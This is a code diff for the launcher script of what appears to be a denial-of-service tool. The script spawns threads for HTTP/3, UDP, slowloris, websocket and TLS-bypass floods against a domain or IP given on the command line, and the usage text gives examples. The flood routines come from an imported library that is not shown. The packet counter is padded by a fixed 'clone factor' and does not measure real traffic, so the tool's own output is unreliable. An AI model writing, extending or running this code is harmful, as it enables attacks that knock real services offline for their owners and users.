@@ -1,65 +1,69 @@
-import threading
-import random
-import time
 import sys
-from bypass import BeyondUltimateAttack
+import threading
+import time
+import random
+import hyperbypass
+from hyperbypass import QuantumDestruction
 
-packet_count = 0  
-lock = threading.Lock()
-speed = 0.01
-packet = 95500  
-byte = 95000    
-clone_factor = 10  
-target_status = "Unknown"  
+packet = 95500
+byte = 95000
+clone_factor = 10
+packet_count = 0
+stop_event = threading.Event()
+status = "Unknown"
 
-def attack(target, threads):
+def monitor_status(target):
+    global status
+    while not stop_event.is_set():
+        attack_status = hyperbypass.monitor_target(target)
+        print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {attack_status}", end="", flush=True)
+        time.sleep(0.5)
+
+def attack(target, threads, attack_type):
     global packet_count
-    stop_event = threading.Event()
-    thread_list = []
+    stop_event.clear()
 
-    if not target.startswith(("http://", "https://")):  
-        target = f"http://{target}"  
-
-    packet_count = threads  
-    print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  
-
-    beyond_attack = BeyondUltimateAttack(target)  
+    attack_instance = QuantumDestruction(target, attack_type)
+    monitor_thread = threading.Thread(target=monitor_status, args=(target,))
+    monitor_thread.start()
 
     for _ in range(threads):
-        t1 = threading.Thread(target=beyond_attack.send_http2_flood)
-        t2 = threading.Thread(target=beyond_attack.send_slowloris)
-        t3 = threading.Thread(target=beyond_attack.websocket_flood)
-
-        t1.start()
-        t2.start()
-        t3.start()
-        
-        thread_list.extend([t1, t2, t3])
+        threading.Thread(target=attack_instance.http3_flood).start()
+        threading.Thread(target=attack_instance.tls_bypass).start()
+        threading.Thread(target=attack_instance.websocket_hijack).start()
+        threading.Thread(target=attack_instance.udp_apocalypse).start()
+        threading.Thread(target=attack_instance.slowloris_stealth).start()
+        threading.Thread(target=attack_instance.quantum_ai_adapt).start()
 
     try:
         while True:
-            time.sleep(1)
-            with lock:
-                packet_count += threads * clone_factor  
-            print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  
+            time.sleep(0.5)
+            packet_count += clone_factor
     except KeyboardInterrupt:
+        print("\n[!] Attack Stopped.")
         stop_event.set()
-        for t in thread_list:
-            t.join()
+        monitor_thread.join()
 
 def main():
     if len(sys.argv) < 3:
-        print("\nUsage:\n  python main.py <target> <threads>\n  python main.py -a <IP> <threads>\n")
+        print("\nUsage:")
+        print(" - Domain Attack: python main.py example.com 100")
+        print(" - IP Attack: python main.py -a 192.168.1.1 100")
+        print(" - Raw IP (No Protocol): python main.py -ip 192.168.1.1 100\n")
         sys.exit(1)
 
     if sys.argv[1] == "-a":
         target = sys.argv[2]
-        threads = int(sys.argv[3])
+        attack_type = "IP"
+    elif sys.argv[1] == "-ip":
+        target = sys.argv[2]
+        attack_type = "RAW_IP"
     else:
         target = sys.argv[1]
-        threads = int(sys.argv[2])
+        attack_type = "HTTP"
 
-    attack(target, threads)
+    threads = int(sys.argv[3] if sys.argv[1] in ["-a", "-ip"] else sys.argv[2])
+    attack(target, threads, attack_type)
 
 if __name__ == "__main__":
     main()
